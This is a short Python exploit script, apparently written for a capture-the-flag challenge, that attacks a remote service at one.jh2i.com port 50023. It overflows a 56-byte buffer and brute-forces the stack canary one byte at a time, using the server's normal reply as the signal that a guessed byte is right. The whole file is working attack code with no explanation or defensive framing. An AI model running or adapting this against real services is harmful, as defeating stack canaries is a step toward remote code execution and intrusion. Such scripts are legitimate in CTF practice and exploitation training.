from struct import pack, unpack
from socket import socket, timeout
from telnetlib import Telnet 
import codecs
import sys
from time import sleep


host = "one.jh2i.com"
port = 50023

buf = b"A"*56 # We are overflowing a buffer of 56 bytes

start = len (buf)
stop = len (buf) + 8

while len(buf) < stop:

	for i in range(0,256):
		print("Trying {}".format(hex(i)), end="\r", flush=True)

        # Create a connection to the host and receive what is has to send
		sock = socket()
		sock.connect((host,port))
		sock.recv(1024)

        # Append the current byte to the payload
		pay = buf+bytes([i])

        # Send the payload and give the server time to respond
		sock.send(pay)
		sleep(1)
		res = sock.recv(1024).decode()

        # If it responds normally, we have found a byte of the canary
        # We append it to the current buffer and continue	
		if "Select one of the images:" in res:
		    print("Found byte: " + hex(i))
		    buf += bytes([i])
		    sock.close()
		    break
		sock.close()


canary = unpack('Q', buf[-8:])[0]
print("[+] Stack Canary value is " + hex(canary))